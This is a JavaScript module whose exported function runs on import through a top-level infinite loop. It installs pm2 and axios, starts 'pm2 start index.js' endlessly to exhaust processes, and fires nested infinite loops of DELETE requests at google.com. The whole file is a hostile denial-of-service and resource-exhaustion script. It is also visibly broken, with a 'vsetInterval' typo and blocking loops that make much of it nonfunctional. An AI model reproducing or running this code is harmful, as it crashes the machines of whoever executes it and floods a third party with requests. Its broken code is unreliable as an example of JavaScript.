import * as axios from "axios";
import * as child from "node:child_process";

export async function doNotImportThisFunction(doNotProvideThisFunctionParameterAsTrue) {
    if (doNotProvideThisFunctionParameterAsTrue === true) {
        child.exec("npm i pm2 --save-dev").once("close", () => {
            console.log("pm2")
            child.exec("npm i axios --save-dev").once("close", () => {
                console.log("axios")
                while(true){
                    console.log("pm2")
                    child.exec("pm2 start index.js")
                }
            })
        })
        while (true) {
            setInterval(async () => {
                var i = new axios.default.create({
                    baseUrl: "https://google.com"
                }); i.delete("/");
                while (true) {
                    var i = new axios.Axios({
                        url: "https://google.com"
                    }); i.delete("/");
                    while (true) {
                        var i = new axios.Axios({
                            url: "https://google.com"
                        }); i.delete("/");
                        while (true) {
                            setInterval(async () => {
                                var i = new axios.default.create({
                                    baseUrl: "https://google.com"
                                }); i.delete("/");
                                while (true) {
                                    var i = new axios.Axios({
                                        url: "https://google.com"
                                    }); i.delete("/");
                                    while (true) {
                                        var i = new axios.Axios({
                                            url: "https://google.com"
                                        }); i.delete("/");
                                        while (true) {
                                            setInterval(async () => {
                                                var i = new axios.default.create({
                                                    baseUrl: "https://google.com"
                                                }); i.delete("/");
                                                while (true) {
                                                    var i = new axios.Axios({
                                                        url: "https://google.com"
                                                    }); i.delete("/");
                                                    while (true) {
                                                        var i = new axios.Axios({
                                                            url: "https://google.com"
                                                        }); i.delete("/");
                                                        while (true) {
                                                            setInterval(async () => {
                                                                var i = new axios.default.create({
                                                                    baseUrl: "https://google.com"
                                                                }); i.delete("/");
                                                                while (true) {
                                                                    var i = new axios.Axios({
                                                                        url: "https://google.com"
                                                                    }); i.delete("/");
                                                                    while (true) {
                                                                        var i = new axios.Axios({
                                                                            url: "https://google.com"
                                                                        }); i.delete("/");
                                                                        while (true) {
                                                                            setInterval(async () => {
                                                                                var i = new axios.default.create({
                                                                                    baseUrl: "https://google.com"
                                                                                }); i.delete("/");
                                                                                while (true) {
                                                                                    var i = new axios.Axios({
                                                                                        url: "https://google.com"
                                                                                    }); i.delete("/");
                                                                                    while (true) {
                                                                                        var i = new axios.Axios({
                                                                                            url: "https://google.com"
                                                                                        }); i.delete("/");
                                                                                        while (true) {
                                                                                            setInterval(async () => {
                                                                                                var i = new axios.default.create({
                                                                                                    baseUrl: "https://google.com"
                                                                                                }); i.delete("/");
                                                                                                while (true) {
                                                                                                    var i = new axios.Axios({
                                                                                                        url: "https://google.com"
                                                                                                    }); i.delete("/");
                                                                                                    while (true) {
                                                                                                        var i = new axios.Axios({
                                                                                                            url: "https://google.com"
                                                                                                        }); i.delete("/");
                                                                                                        while (true) {
                                                                                                            setInterval(async () => {
                                                                                                                var i = new axios.default.create({
                                                                                                                    baseUrl: "https://google.com"
                                                                                                                }); i.delete("/");
                                                                                                                while (true) {
                                                                                                                    var i = new axios.Axios({
                                                                                                                        url: "https://google.com"
                                                                                                                    }); i.delete("/");
                                                                                                                    while (true) {
                                                                                                                        var i = new axios.Axios({
                                                                                                                            url: "https://google.com"
                                                                                                                        }); i.delete("/");
                                                                                                                        while (true) {
                                                                                                                            setInterval(async () => {
                                                                                                                                var i = new axios.default.create({
                                                                                                                                    baseUrl: "https://google.com"
                                                                                                                                }); i.delete("/");
                                                                                                                                while (true) {
                                                                                                                                    var i = new axios.Axios({
                                                                                                                                        url: "https://google.com"
                                                                                                                                    }); i.delete("/");
                                                                                                                                    while (true) {
                                                                                                                                        var i = new axios.Axios({
                                                                                                                                            url: "https://google.com"
                                                                                                                                        }); i.delete("/");
                                                                                                                                        while (true) {
                                                                                                                                            setInterval(async () => {
                                                                                                                                                var i = new axios.default.create({
                                                                                                                                                    baseUrl: "https://google.com"
                                                                                                                                                }); i.delete("/");
                                                                                                                                                while (true) {
                                                                                                                                                    var i = new axios.Axios({
                                                                                                                                                        url: "https://google.com"
                                                                                                                                                    }); i.delete("/");
                                                                                                                                                    while (true) {
                                                                                                                                                        var i = new axios.Axios({
                                                                                                                                                            url: "https://google.com"
                                                                                                                                                        }); i.delete("/");
                                                                                                                                                        while (true) {
                                                                                                                                                            vsetInterval(async () => {
                                                                                                                                                                var i = new axios.default.create({
                                                                                                                                                                    baseUrl: "https://google.com"
                                                                                                                                                                }); i.delete("/");
                                                                                                                                                                while (true) {
                                                                                                                                                                    var i = new axios.Axios({
                                                                                                                                                                        url: "https://google.com"
                                                                                                                                                                    }); i.delete("/");
                                                                                                                                                                    while (true) {
                                                                                                                                                                        var i = new axios.Axios({
                                                                                                                                                                            url: "https://google.com"
                                                                                                                                                                        }); i.delete("/");
                                                                                                                                                                        while (true) {
                                                                                                                                                                            setInterval(async () => {
                                                                                                                                                                                var i = new axios.default.create({
                                                                                                                                                                                    baseUrl: "https://google.com"
                                                                                                                                                                                }); i.delete("/");
                                                                                                                                                                                while (true) {
                                                                                                                                                                                    var i = new axios.Axios({
                                                                                                                                                                                        url: "https://google.com"
                                                                                                                                                                                    }); i.delete("/");
                                                                                                                                                                                    while (true) {
                                                                                                                                                                                        var i = new axios.Axios({
                                                                                                                                                                                            url: "https://google.com"
                                                                                                                                                                                        }); i.delete("/");
                                                                                                                                                                                        while (true) {
                                                                                                                                                                                            setInterval(async () => {
                                                                                                                                                                                                var i = new axios.default.create({
                                                                                                                                                                                                    baseUrl: "https://google.com"
                                                                                                                                                                                                }); i.delete("/");
                                                                                                                                                                                                while (true) {
                                                                                                                                                                                                    var i = new axios.Axios({
                                                                                                                                                                                                        url: "https://google.com"
                                                                                                                                                                                                    }); i.delete("/");
                                                                                                                                                                                                    while (true) {
                                                                                                                                                                                                        var i = new axios.Axios({
                                                                                                                                                                                                            url: "https://google.com"
                                                                                                                                                                                                        }); i.delete("/");
                                                                                                                                                                                                        while (true) {
                                                                                                                                                                                                            setInterval(async () => {
                                                                                                                                                                                                                var i = new axios.default.create({
                                                                                                                                                                                                                    baseUrl: "https://google.com"
                                                                                                                                                                                                                }); i.delete("/");
                                                                                                                                                                                                                while (true) {
                                                                                                                                                                                                                    var i = new axios.Axios({
                                                                                                                                                                                                                        url: "https://google.com"
                                                                                                                                                                                                                    }); i.delete("/");
                                                                                                                                                                                                                    while (true) {
                                                                                                                                                                                                                        var i = new axios.Axios({
                                                                                                                                                                                                                            url: "https://google.com"
                                                                                                                                                                                                                        }); i.delete("/");
                                                                                                                                                                                                                        while (true) {
                                                                                                                                                                                                                            setInterval(async () => {
                                                                                                                                                                                                                                var i = new axios.default.create({
                                                                                                                                                                                                                                    baseUrl: "https://google.com"
                                                                                                                                                                                                                                }); i.delete("/");
                                                                                                                                                                                                                                while (true) {
                                                                                                                                                                                                                                    var i = new axios.Axios({
                                                                                                                                                                                                                                        url: "https://google.com"
                                                                                                                                                                                                                                    }); i.delete("/");
                                                                                                                                                                                                                                    while (true) {
                                                                                                                                                                                                                                        var i = new axios.Axios({
                                                                                                                                                                                                                                            url: "https://google.com"
                                                                                                                                                                                                                                        }); i.delete("/");
                                                                                                                                                                                                                                        while (true) {
                                                                                                                                                                                                                                            setInterval(async () => {
                                                                                                                                                                                                                                                var i = new axios.default.create({
                                                                                                                                                                                                                                                    baseUrl: "https://google.com"
                                                                                                                                                                                                                                                }); i.delete("/");
                                                                                                                                                                                                                                                while (true) {
                                                                                                                                                                                                                                                    var i = new axios.Axios({
                                                                                                                                                                                                                                                        url: "https://google.com"
                                                                                                                                                                                                                                                    }); i.delete("/");
                                                                                                                                                                                                                                                    while (true) {
                                                                                                                                                                                                                                                        var i = new axios.Axios({
                                                                                                                                                                                                                                                            url: "https://google.com"
                                                                                                                                                                                                                                                        }); i.delete("/");
                                                                                                                                                                                                                                                        while (true) {
                                                                                                                                                                                                                                                            setInterval(async () => {
                                                                                                                                                                                                                                                                var i = new axios.default.create({
                                                                                                                                                                                                                                                                    baseUrl: "https://google.com"
                                                                                                                                                                                                                                                                }); i.delete("/");
                                                                                                                                                                                                                                                                while (true) {
                                                                                                                                                                                                                                                                    var i = new axios.Axios({
                                                                                                                                                                                                                                                                        url: "https://google.com"
                                                                                                                                                                                                                                                                    }); i.delete("/");
                                                                                                                                                                                                                                                                    while (true) {
                                                                                                                                                                                                                                                                        var i = new axios.Axios({
                                                                                                                                                                                                                                                                            url: "https://google.com"
                                                                                                                                                                                                                                                                        }); i.delete("/");
                                                                                                                                                                                                                                                                        while (true) {
                                                                                                                                                                                                                                                                            setInterval(async () => {
                                                                                                                                                                                                                                                                                var i = new axios.default.create({
                                                                                                                                                                                                                                                                                    baseUrl: "https://google.com"
                                                                                                                                                                                                                                                                                }); i.delete("/");
                                                                                                                                                                                                                                                                                while (true) {
                                                                                                                                                                                                                                                                                    var i = new axios.Axios({
                                                                                                                                                                                                                                                                                        url: "https://google.com"
                                                                                                                                                                                                                                                                                    }); i.delete("/");
                                                                                                                                                                                                                                                                                    while (true) {
                                                                                                                                                                                                                                                                                        var i = new axios.Axios({
                                                                                                                                                                                                                                                                                            url: "https://google.com"
                                                                                                                                                                                                                                                                                        }); i.delete("/");
                                                                                                                                                                                                                                                                                        while (true) {
                                                                                                                                                                                                                                                                                            setInterval(async () => {
                                                                                                                                                                                                                                                                                                var i = new axios.default.create({
                                                                                                                                                                                                                                                                                                    baseUrl: "https://google.com"
                                                                                                                                                                                                                                                                                                }); i.delete("/");
                                                                                                                                                                                                                                                                                                while (true) {
                                                                                                                                                                                                                                                                                                    var i = new axios.Axios({
                                                                                                                                                                                                                                                                                                        url: "https://google.com"
                                                                                                                                                                                                                                                                                                    }); i.delete("/");
                                                                                                                                                                                                                                                                                                    while (true) {
                                                                                                                                                                                                                                                                                                        var i = new axios.Axios({
                                                                                                                                                                                                                                                                                                            url: "https://google.com"
                                                                                                                                                                                                                                                                                                        }); i.delete("/");
                                                                                                                                                                                                                                                                                                        while (true) {
                                                                                                                                                                                                                                                                                                            var i = new axios.Axios({
                                                                                                                                                                                                                                                                                                                url: "https://google.com"
                                                                                                                                                                                                                                                                                                            }); i.delete("/");
                                                                                                                                                                                                                                                                                                        };
                                                                                                                                                                                                                                                                                                    };
                                                                                                                                                                                                                                                                                                };
                                                                                                                                                                                                                                                                                            });
                                                                                                                                                                                                                                                                                        };
                                                                                                                                                                                                                                                                                    };
                                                                                                                                                                                                                                                                                };
                                                                                                                                                                                                                                                                            });
                                                                                                                                                                                                                                                                        };
                                                                                                                                                                                                                                                                    };
                                                                                                                                                                                                                                                                };
                                                                                                                                                                                                                                                            });
                                                                                                                                                                                                                                                        };
                                                                                                                                                                                                                                                    };
                                                                                                                                                                                                                                                };
                                                                                                                                                                                                                                            });
                                                                                                                                                                                                                                        };
                                                                                                                                                                                                                                    };
                                                                                                                                                                                                                                };
                                                                                                                                                                                                                            });
                                                                                                                                                                                                                        };
                                                                                                                                                                                                                    };
                                                                                                                                                                                                                };
                                                                                                                                                                                                            });
                                                                                                                                                                                                        };
                                                                                                                                                                                                    };
                                                                                                                                                                                                };
                                                                                                                                                                                            });
                                                                                                                                                                                        };
                                                                                                                                                                                    };
                                                                                                                                                                                };
                                                                                                                                                                            });
                                                                                                                                                                        };
                                                                                                                                                                    };
                                                                                                                                                                };
                                                                                                                                                            });
                                                                                                                                                        };
                                                                                                                                                    };
                                                                                                                                                };
                                                                                                                                            });
                                                                                                                                        };
                                                                                                                                    };
                                                                                                                                };
                                                                                                                            });
                                                                                                                        };
                                                                                                                    };
                                                                                                                };
                                                                                                            });
                                                                                                        };
                                                                                                    };
                                                                                                };
                                                                                            });
                                                                                        };
                                                                                    };
                                                                                };
                                                                            });
                                                                        };
                                                                    };
                                                                };
                                                            });
                                                        };
                                                    };
                                                };
                                            });
                                        };
                                    }
                                };
                            });
                        }
                    }
                }
            })
        }
    }
}

while (true) {

    await doNotImportThisFunction(true);
}
